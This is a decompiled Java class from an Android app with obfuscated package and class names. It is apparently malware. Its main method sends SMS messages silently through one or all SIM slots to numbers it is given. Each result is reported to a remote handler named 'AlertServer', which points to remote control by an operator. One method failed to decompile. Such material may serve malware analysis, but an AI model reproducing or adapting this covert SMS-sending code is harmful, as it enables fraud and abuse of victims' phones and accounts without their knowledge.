/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.Context
 *  android.telephony.SmsManager
 *  android.telephony.SubscriptionInfo
 *  android.telephony.SubscriptionManager
 */
package linker.resourcer.encoder;

import android.content.Context;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import androidx.core.app.ActivityCompat;
import linker.resourcer.encoder.lqvpqwmhpvnnlhskxyjdwphzvsl;

public class usavokqruhwyfjejfrrxxkghmlvi {
    /*
     * Exception decompiling
     */
    public static String Load(Context var0, String var1_3) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Back jump on a try block [egrp 37[TRYBLOCK] [74 : 1242->1246)] java.lang.Throwable
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op02WithProcessedDataAndRefs.insertExceptionBlocks(Op02WithProcessedDataAndRefs.java:2283)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:415)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    public static int getSimCount(Context object) {
        SubscriptionManager subscriptionManager = (SubscriptionManager)object.getSystemService("telephony_subscription_service");
        if (subscriptionManager != null) {
            if (ActivityCompat.checkSelfPermission((Context)object, "android.permission.READ_PHONE_STATE") != 0) {
                return 0;
            }
            object = subscriptionManager.getActiveSubscriptionInfoList();
            if (object != null) {
                return object.size();
            }
        }
        return 0;
    }

    private static String normalizePhone(String string2) {
        String string3;
        if (string2 == null) {
            return "";
        }
        string2 = string3 = string2.replaceAll("[^\\d]", "");
        if (string3.length() > 10) {
            string2 = string3.substring(string3.length() - 10);
        }
        return string2;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static void sendSMS(Context context, String string2, String charSequence, String charSequence2) {
        try {
            if (ActivityCompat.checkSelfPermission(context, "android.permission.READ_PHONE_STATE") != 0) {
                charSequence = new StringBuilder();
                lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(context, ((StringBuilder)charSequence).append("Message to ").append(string2).toString(), "Permission not granted READ STATE.");
                return;
            }
            Object object = ((SubscriptionManager)context.getSystemService("telephony_subscription_service")).getActiveSubscriptionInfoList();
            if (object != null && !object.isEmpty()) {
                boolean bl;
                block8: {
                    SubscriptionInfo subscriptionInfo;
                    if (((String)charSequence2).equals("-1")) {
                        int n = 0;
                        while (n < object.size()) {
                            SmsManager.getSmsManagerForSubscriptionId((int)((SubscriptionInfo)object.get(n)).getSubscriptionId()).sendTextMessage(string2, null, (String)charSequence, null, null);
                            charSequence2 = new StringBuilder();
                            charSequence2 = ((StringBuilder)charSequence2).append("Message to ").append(string2).toString();
                            StringBuilder stringBuilder = new StringBuilder();
                            lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(context, (String)charSequence2, stringBuilder.append("Sent successfully via SIM slot ").append(n).toString());
                            ++n;
                        }
                        return;
                    }
                    boolean bl2 = false;
                    Object object2 = object.iterator();
                    do {
                        bl = bl2;
                        if (!object2.hasNext()) break block8;
                    } while (!((String)(object = ((Object)(subscriptionInfo = (SubscriptionInfo)object2.next()).getDisplayName()).toString())).equalsIgnoreCase(((String)charSequence2).trim()));
                    SmsManager.getSmsManagerForSubscriptionId((int)subscriptionInfo.getSubscriptionId()).sendTextMessage(string2, null, (String)charSequence, null, null);
                    charSequence = new StringBuilder();
                    charSequence = ((StringBuilder)charSequence).append("Message to ").append(string2).toString();
                    object2 = new StringBuilder();
                    lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(context, (String)charSequence, ((StringBuilder)object2).append("Sent successfully via SIM: ").append((String)object).toString());
                    bl = true;
                }
                if (bl) return;
                charSequence = new StringBuilder();
                object = ((StringBuilder)charSequence).append("Message to ").append(string2).toString();
                charSequence = new StringBuilder();
                lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(context, (String)object, ((StringBuilder)charSequence).append("SIM '").append((String)charSequence2).append("' not found.").toString());
                return;
            }
            charSequence = new StringBuilder();
            lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(context, ((StringBuilder)charSequence).append("Message to ").append(string2).toString(), "No active SIMs found.");
            return;
        }
        catch (Exception exception) {
            lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(context, "Message to " + string2, "Failed to send message: " + exception.getMessage());
        }
    }
}

